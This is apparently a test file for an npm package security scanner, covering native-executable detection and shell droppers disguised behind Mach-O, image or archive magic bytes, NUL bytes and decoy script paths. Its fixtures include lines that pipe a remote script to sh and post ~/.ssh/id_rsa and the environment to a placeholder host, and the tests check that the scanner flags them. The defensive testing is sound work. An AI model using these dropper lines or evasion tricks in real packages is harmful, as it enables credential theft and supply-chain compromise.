// Native executables are listed as `binary` (the native capability) and not read as code when their structure parses
// (executable.ts), whatever their name; a magic number alone never makes a file native code, and a file something runs
// through an interpreter is read as source whatever its bytes (review of 1978ee3, P1: `cf fa ed fe`, a newline and
// shell commands, run by `sh lib/tool` at install, scored 75 (B) with complete coverage). The magic used to be joined
// with `<<` into a signed 32-bit number, so no Mach-O matched: @typescript/typescript-darwin-arm64 7.0.2's 24 MB
// lib/tsc was read as code, the platform stopped every run, and the smaller re-run stored 29 (F).
import { describe, expect, test } from "bun:test";
import { analyze, EXECUTABLE_HEAD_BYTES, finalize, findingsOf, isExecutable, MAX_ANALYSIS_WORK, MAX_ANALYZED_FILE_BYTES, MAX_VIEW_CHARS, scanBinaryText, shellTokens, Meter, SCORE_FLOOR, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";
import { CPU_ARM64, CPU_X86_64, elf, fatMachO, machO } from "./executables.ts";

const enc = new TextEncoder();
const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

/** Text a reader of code would flag: a pipe to a shell, a credential path and a request. */
const SUSPICIOUS = "curl -s https://example.invalid/x.sh | sh; cat ~/.ssh/id_rsa; fetch('https://example.invalid/c', { method: 'POST' });\n";

/** The reviewer's payload: a dropper, a credential file sent out, and the environment sent out. */
const DROPPER = [
  "curl -s https://collector.invalid/x.sh | sh",
  "cat ~/.ssh/id_rsa | curl -s -X POST --data-binary @- https://collector.invalid/k",
  "env | curl -s -X POST --data-binary @- https://collector.invalid/e",
  "",
].join("\n");

function entry(path: string, data: Uint8Array, mode = 0o644): TarEntry {
  return { path, size: data.length, mode, data };
}

/**
 * What a real executable's string table holds: usage text, and the names of what it can do (a shell, the network, the
 * environment), none of it what malware does. Measured on real binaries (binary-text.ts), such text adds nothing.
 */
const BENIGN = "usage: tool [options] <file>\n  --help  show this help\n/bin/sh -c\0child_process.exec\0process.env.HOME\0https://example.com/docs\0";

/** `prefix`, then `size` bytes of filler that repeats `text` (BENIGN by default), as an executable's string table might. */
function filled(prefix: Uint8Array, size: number, filler = BENIGN): Uint8Array {
  const out = new Uint8Array(Math.max(size, prefix.length));
  const text = enc.encode(filler);
  out.set(prefix, 0);

  for (let at = prefix.length; at < out.length; at += text.length) out.set(text.subarray(0, Math.min(text.length, out.length - at)), at);

  return out;
}

function analyzeWith(files: TarEntry[], manifest: AnalyzeInput["manifest"] = {}, meter?: Meter): Analysis {
  const m = { name: "probe-native", version: "1.0.0", license: "MIT", ...manifest };

  return analyze({ name: "probe-native", manifest: m, files: [entry("package.json", enc.encode(JSON.stringify(m))), ...files], publisher: "a", previousPublishers: [], meter });
}

const ids = (a: Analysis): string[] => findingsOf(a).map((s) => s.id);

/** A valid executable of each format, with filler that matches text rules after its headers. */
const FORMATS: { name: string; bytes: Uint8Array }[] = [
  { name: "ELF", bytes: elf({ size: 64 * 1024, tail: filled(new Uint8Array(), 60 * 1024) }) },
  { name: "Mach-O 64-bit (arm64)", bytes: machO({ size: 64 * 1024, tail: filled(new Uint8Array(), 60 * 1024) }) },
  { name: "Mach-O 32-bit", bytes: machO({ size: 64 * 1024, wide: false, tail: filled(new Uint8Array(), 60 * 1024) }) },
  { name: "Mach-O 64-bit, big-endian", bytes: machO({ size: 64 * 1024, little: false, tail: filled(new Uint8Array(), 60 * 1024) }) },
  { name: "Mach-O 32-bit, big-endian", bytes: machO({ size: 64 * 1024, wide: false, little: false, tail: filled(new Uint8Array(), 60 * 1024) }) },
  { name: "universal Mach-O", bytes: fatMachO({ slices: [machO({ size: 8192 }), machO({ size: 8192, cpu: CPU_X86_64 })], cpus: [CPU_ARM64, CPU_X86_64] }) },
  { name: "universal Mach-O, 64-bit offsets", bytes: fatMachO({ slices: [machO({ size: 8192 })], wide: true }) },
];

describe("a native executable is listed by its structure, and not read when nothing runs it as a script", () => {
  for (const f of FORMATS) {
    test(`${f.name}, with no file extension`, () => {
      expect(isExecutable(f.bytes, f.bytes.length)).toBe(true);
      const a = analyzeWith([entry("lib/tool", f.bytes, 0o755)]);

      expect(findingsOf(a).find((s) => s.id === "binary")?.evidence).toEqual(["lib/tool"]);
      expect(a.capabilities.map((c) => c.id)).toContain("native");
      // its ordinary string table costs nothing: no risk signal, a clean score, read whole
      expect(finalize(a, STATE).signals.filter((x) => x.points < 0)).toEqual([]);
      expect(finalize(a, STATE).score).toBe(100);
      expect(a.coverage).toEqual({ kind: "complete" });
    });
  }

  test("a 24 MB Mach-O costs a small part of the meter to list and to read for shell text (the darwin typescript packages)", () => {
    const meter = new Meter(320_000_000);
    const a = analyzeWith([entry("lib/tsc", filled(machO({ size: 4096 }), 24 * 1024 * 1024), 0o755)], {}, meter);

    expect(findingsOf(a).find((s) => s.id === "binary")?.evidence).toEqual(["lib/tsc"]);
    expect(a.coverage).toEqual({ kind: "complete" });
    // its text is read exactly as production decoded it, both views (the filler has NUL bytes), and fits well inside
    // the queue's meter: this all-text filler is the worst case (the real lib/tsc, 111 million units with its package)
    expect(meter.used).toBeLessThan(MAX_ANALYSIS_WORK / 3);
  });

  test("a PE file named .exe is listed; MZ without that name is read: MZ can start JavaScript", () => {
    expect(ids(analyzeWith([entry("bin/tool.exe", filled(new Uint8Array([0x4d, 0x5a, 0x90, 0x00]), 4096))]))).toContain("binary");
    const a = analyzeWith([entry("index.js", enc.encode(`MZ = 1;\n${SUSPICIOUS}`))]);

    expect(ids(a)).not.toContain("binary");
    expect(ids(a)).toContain("network");
  });
});

describe("a magic number alone is not native code (review of 1978ee3, P1)", () => {
  // the reviewer's package: a postinstall runs `sh lib/tool`, and lib/tool is the Mach-O magic, a newline and a dropper
  const disguised = new Uint8Array([0xcf, 0xfa, 0xed, 0xfe, 0x0a, ...enc.encode(DROPPER)]);

  test("the reviewer's package: magic, newline, shell commands, run by `sh lib/tool` at install, scores under the floor", () => {
    expect(isExecutable(disguised, disguised.length)).toBe(false);
    const a = analyzeWith([entry("lib/tool", disguised, 0o755)], { scripts: { postinstall: "sh lib/tool" } });
    const report = finalize(a, STATE);

    // on 1978ee3: 75 (B), complete, none of these
    expect(report.score).toBeLessThan(SCORE_FLOOR);
    expect(ids(a)).toEqual(expect.arrayContaining(["remote-shell", "install-download"]));
    expect(ids(a)).not.toContain("binary");
  });

  test("the same file with nothing running it is read as text, not listed", () => {
    const a = analyzeWith([entry("lib/tool", disguised, 0o755)]);

    expect(ids(a)).not.toContain("binary");
    expect(ids(a)).toContain("remote-shell");
  });

  test("each magic with broken structure is not native code: truncated load commands, a segment past the file, a Java class", () => {
    const good = machO({ size: 4096 });
    const truncated = good.slice(0, 40);
    const past = machO({ size: 4096 });
    new DataView(past.buffer).setBigUint64(32 + 48, 1n << 40n, true);
    const java = new Uint8Array([0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34, ...new Uint8Array(64)]);
    const elfShort = elf({ size: 4096 }).slice(0, 100);

    expect(isExecutable(good, good.length)).toBe(true);
    expect(isExecutable(truncated, 4096)).toBe(false);
    expect(isExecutable(truncated, truncated.length)).toBe(false);
    expect(isExecutable(past, past.length)).toBe(false);
    expect(isExecutable(java, java.length)).toBe(false);
    expect(isExecutable(elfShort, elfShort.length)).toBe(false);
  });

  // review of 4ac264b, P2: a streamed read checked a universal binary's first slice and skipped one past its head, and
  // skipped an ELF file's segments when its program header table lay past the head; both scored 100 streamed, 0 whole
  test("structure the bytes at hand do not show is not proof: a universal slice or an ELF program table past the head", () => {
    const payload = new Uint8Array(8192);
    payload.set(enc.encode(`\n${DROPPER}`));
    const fat = fatMachO({ slices: [machO({ size: 200 * 1024 }), payload], cpus: [CPU_ARM64, CPU_X86_64] });

    // the second slice is not a Mach-O: whole, the file is not one; from its head, which does not reach that slice, nor
    expect(isExecutable(fat, fat.length)).toBe(false);
    expect(isExecutable(fat.subarray(0, EXECUTABLE_HEAD_BYTES), fat.length)).toBe(false);
    // two valid slices, the second past the head: whole it is one; from the head alone it is not known to be
    const both = fatMachO({ slices: [machO({ size: 200 * 1024 }), machO({ size: 8192, cpu: CPU_X86_64 })], cpus: [CPU_ARM64, CPU_X86_64] });

    expect(isExecutable(both, both.length)).toBe(true);
    expect(isExecutable(both.subarray(0, EXECUTABLE_HEAD_BYTES), both.length)).toBe(false);
    // an ELF file whose program header table sits past the head
    const far = elf({ size: 128 * 1024 });
    const view = new DataView(far.buffer);
    const table = 100 * 1024;
    far.copyWithin(table, 64, 120);
    view.setBigUint64(32, BigInt(table), true);

    expect(isExecutable(far, far.length)).toBe(true);
    expect(isExecutable(far.subarray(0, EXECUTABLE_HEAD_BYTES), far.length)).toBe(false);
  });

  test("the structure is checked from the first EXECUTABLE_HEAD_BYTES of a file a streamed read does not hold", () => {
    const big = machO({ size: 4 * 1024 * 1024 });

    expect(isExecutable(big.subarray(0, EXECUTABLE_HEAD_BYTES), big.length)).toBe(true);
    // 16 bytes (what a streamed read used to keep) prove nothing
    expect(isExecutable(big.subarray(0, 16), big.length)).toBe(false);
  });
});

describe("a file something runs as a script is read as source whatever its bytes", () => {
  // a valid Mach-O header and load commands, then a dropper: a shell reading it runs the lines after the header
  const polyglot = machO({ size: 4096, tail: enc.encode(`\n${DROPPER}`) });

  test.each([
    ["a lifecycle script, `sh lib/tool`", { scripts: { postinstall: "sh lib/tool" } }],
    ["a lifecycle script that execs it, `./lib/tool`", { scripts: { install: "./lib/tool --setup" } }],
    ["another script, `bash lib/tool`", { scripts: { start: "bash lib/tool" } }],
    ["a bin target", { bin: { tool: "lib/tool" } }],
  ] as const)("%s", (_name, manifest) => {
    expect(isExecutable(polyglot, polyglot.length)).toBe(true);
    const a = analyzeWith([entry("lib/tool", polyglot, 0o755)], manifest);

    // read, and still listed as native code: it is a real executable too
    expect(ids(a)).toEqual(expect.arrayContaining(["binary", "remote-shell"]));
  });

  test("a command in code (`execSync('sh lib/tool')`) reads it too, even when the walk passed it over first", () => {
    // the binary sorts before index.js in the walk's second pass, so it is passed over before the command is seen
    const a = analyzeWith([entry("a/tool", polyglot, 0o755), entry("index.js", enc.encode("require('child_process').execSync('sh a/tool');\n"))], { main: "index.js" });

    expect(ids(a)).toEqual(expect.arrayContaining(["binary", "remote-shell"]));
  });

  test("an entry point with a native name that holds JavaScript is read: node runs index.so as JavaScript", () => {
    const a = analyzeWith([entry("index.so", enc.encode(SUSPICIOUS))], { main: "index.so" });

    expect(ids(a)).toContain("network");
  });

  test("a real executable with an ordinary string table scores clean: an ELF file adds nothing, a Mach-O what production's text read lists", () => {
    const elfFile = analyzeWith([entry("lib/tool", filled(elf({ size: 4096 }), 64 * 1024), 0o755)], { main: "index.js" });
    const mach = analyzeWith([entry("lib/tool", filled(machO({ size: 4096 }), 64 * 1024), 0o755)], { main: "index.js" });

    // production never read an ELF file, and its text adds only what malware does
    expect(ids(elfFile)).toEqual(["binary"]);
    expect(elfFile.capabilities.map((c) => c.id)).toEqual(["native"]);
    // production read a Mach-O as text: its text is read as production read it, and costs nothing here either
    expect(finalize(mach, STATE).score).toBe(100);
  });
});

// review of 4ac264b, P1: content the package can run as a script never escapes the source checks because of its first
// bytes. A shell runs a file line by line whoever runs it and however (a path built at runtime, a script that sources
// it), so what a shell could run in every file read as binary is read for what malware does (binary-text.ts)
describe("what a shell could run in a binary file production read as text is read as production read it", () => {
  const polyglot = machO({ size: 4096, tail: enc.encode(`\n${DROPPER}`) });

  test("the reviewer's case: a valid Mach-O with shell lines that nothing visibly runs scores under the floor", () => {
    expect(isExecutable(polyglot, polyglot.length)).toBe(true);
    const a = analyzeWith([entry("lib/tool", polyglot, 0o755)], { main: "index.js" });

    // on 4ac264b: 100 (A), the native capability alone
    expect(finalize(a, STATE).score).toBeLessThan(SCORE_FLOOR);
    expect(ids(a)).toContain("binary");
    expect(finalize(a, STATE).signals.map((x) => x.id)).toEqual(expect.arrayContaining(["remote-shell", "credential-read", "exfiltration"]));
    // cited on the file's own lines
    expect(findingsOf(a).find((s) => s.id === "remote-shell")?.evidence[0]).toStartWith("lib/tool:2: ");
  });

  // review of 45d3655, P1: the text was read in 16 KiB pieces joined by a newline, so `curl ... | sh` across a piece's
  // end was never seen: production (274d284) scored these bytes 39, 45d3655 100. Nothing is cut or joined now
  test.each([16_360, 16_380, 16_383, 16_384, 16_390, 32_760, 65_530])("`curl ... | sh` after %i spaces in a 32 KiB Mach-O is seen whole, on its own line", (padding) => {
    const data = machO({ size: 32_768, tail: enc.encode(`\n${" ".repeat(padding)}curl https://collector.invalid/x.sh | sh\n`) });
    const a = analyzeWith([entry("lib/tool", data, 0o755)], { main: "index.js" });

    expect(finalize(a, STATE).score).toBeLessThan(SCORE_FLOOR);
    expect(findingsOf(a).find((s) => s.id === "remote-shell")?.evidence[0]).toStartWith("lib/tool:2: ");
  });

  test("a match across bytes production decoded as U+FFFD still matches: a run of them is one character, not a line break", () => {
    // `curl` and the rest of the command sit on one line, with bytes no text holds between the URL's parts
    const data = new Uint8Array([...machO({ size: 4096 }), 0x0a, ...enc.encode("curl https://collector.invalid/"), 0x80, 0x81, ...enc.encode("x.sh | sh\n")]);
    const a = analyzeWith([entry("lib/tool", data, 0o755)], { main: "index.js" });

    expect(finalize(a, STATE).score).toBeLessThan(SCORE_FLOOR);
  });

  test("a binary whose text passes MAX_VIEW_CHARS is never cut: it is too large to read, as production reported it", () => {
    const big = new Uint8Array(MAX_VIEW_CHARS + 4096);
    big.set(machO({ size: 4096 }));
    big.fill(0x20, 4096);
    big.set(enc.encode("\ncurl https://collector.invalid/x.sh | sh\n"), big.length - 64);

    expect(scanBinaryText(big)).toMatchObject({ kind: "too-large" });
    // MAX_VIEW_CHARS is production's own limit on a file it reads (MAX_ANALYZED_FILE_BYTES), and a file decodes to no
    // more code units than it has bytes: one past it is reported unread, as production reported it, never read in part
    expect(MAX_VIEW_CHARS).toBe(MAX_ANALYZED_FILE_BYTES);
    const a = analyzeWith([entry("lib/tool", big, 0o755)], { main: "index.js" });

    expect(a.coverage?.kind).toBe("partial");
    expect(a.skipped).toEqual([{ path: "lib/tool", size: big.length, reason: "too-large" }]);
  }, 120_000);

  test.each([
    ["a shell script runs it: `sh setup.sh`, which runs `sh lib/tool`", { "setup.sh": "#!/bin/sh\nsh lib/tool\n" }],
    ["a shell script sources it: `. ./lib/tool`", { "setup.sh": "#!/bin/sh\n. ./lib/tool\n" }],
    ["a script in a folder runs it by the package's path: `sh lib/tool`", { "scripts/setup.sh": "#!/bin/sh\nsh lib/tool\n" }],
  ] as const)("%s: read as source, and scored under the floor", (_name, scripts) => {
    const run = Object.keys(scripts)[0] ?? "setup.sh";
    const a = analyzeWith([...Object.entries(scripts).map(([p, t]) => entry(p, enc.encode(t))), entry("lib/tool", polyglot, 0o755)], { scripts: { postinstall: `sh ${run}` } });

    // on 4ac264b: 90 (A); the same bytes run directly scored 0
    expect(finalize(a, STATE).score).toBeLessThan(SCORE_FLOOR);
    expect(ids(a)).toEqual(expect.arrayContaining(["remote-shell", "install-script"]));
  });

  // review of 45d3655, P1: the walker read a quoted path with a space as two words, and preferred a decoy beside the
  // script to the file npm's package-folder cwd runs. It only adds now: every plausible target is read
  test("a quoted path with a space, and the file npm's cwd runs beside a decoy next to the script, are both read", () => {
    const quoted = analyzeWith([entry("setup.sh", enc.encode('#!/bin/sh\nsh "lib/pay load.txt"\n')), entry("lib/pay load.txt", enc.encode(DROPPER))], { scripts: { postinstall: "sh setup.sh" } });

    const shadow = analyzeWith(
      [entry("scripts/setup.sh", enc.encode("#!/bin/sh\nsh lib/payload.txt\n")), entry("scripts/lib/payload.txt", enc.encode("echo hello\n")), entry("lib/payload.txt", enc.encode(DROPPER))],
      { scripts: { postinstall: "sh scripts/setup.sh" } },
    );

    // on 45d3655: 90 (A) both, the payload never read
    expect(finalize(quoted, STATE).score).toBeLessThan(SCORE_FLOOR);
    expect(finalize(shadow, STATE).score).toBeLessThan(SCORE_FLOOR);
  });

  test("a target the walk cannot resolve (a variable, a glob, a path out of the package) adds nothing and takes nothing away", () => {
    const files = [entry("setup.sh", enc.encode('#!/bin/sh\np=lib/\nsh "${p}tool"\nsh lib/*.sh\nsh ../outside.sh\n')), entry("outside.sh", enc.encode(DROPPER))];
    const a = analyzeWith(files, { scripts: { postinstall: "sh setup.sh" } });
    const without = analyzeWith(files.slice(0, 1), { scripts: { postinstall: "sh setup.sh" } });

    // outside.sh is not what `../outside.sh` names from the package's folder: not read as run, scored as an unreached file
    expect(shellTokens('p=lib/\nsh "${p}tool"\nsh lib/*.sh')).toEqual({ kind: "complete", words: ["p=lib/", "sh", "sh"] });
    expect(finalize(without, STATE).score).toBe(90);
    expect(a.coverage).toEqual({ kind: "complete" });
  });

  test.each([
    ["a native name (.node)", "lib/tool.node", enc.encode(`\n${DROPPER}`)],
    ["an image's magic", "assets/logo.png", new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...enc.encode(`\n${DROPPER}`)])],
    ["an archive's magic", "assets/data.gz", new Uint8Array([0x1f, 0x8b, 0x08, 0x00, ...enc.encode(`\n${DROPPER}`)])],
  ] as const)("a file read as binary by %s, which production never read, is not read for text either; run by a script, it is read as source", (_name, path, data) => {
    // deploy 1 for launch: production (274d284) never read a native name, an ELF file or data, and reading such a file's
    // text exactly cost about five meter units a byte (a 33 MiB addon spent a streamed read's budget), so it is read
    // as production read it
    const a = analyzeWith([entry(path, data)], { main: "index.js" });

    expect(ids(a)).not.toContain("remote-shell");
    expect(a.coverage).toEqual({ kind: "complete" });
    // a script that runs it reads it as source whatever its name or bytes, as before
    const run = analyzeWith([entry(path, data), entry("setup.sh", enc.encode(`#!/bin/sh\nsh ${path}\n`))], { scripts: { postinstall: "sh setup.sh" } });

    expect(finalize(run, STATE).score).toBeLessThan(SCORE_FLOOR);
    expect(ids(run)).toContain("remote-shell");
  });

  test("NUL bytes inside a command do not hide it: dash deletes them before it reads the line", () => {
    const hidden = new Uint8Array([...machO({ size: 4096 }), 0x0a, ...[...enc.encode(DROPPER)].flatMap((b) => [b, 0])]);
    const a = analyzeWith([entry("lib/tool", hidden, 0o755)], { main: "index.js" });

    expect(ids(a)).toContain("remote-shell");
  });
});
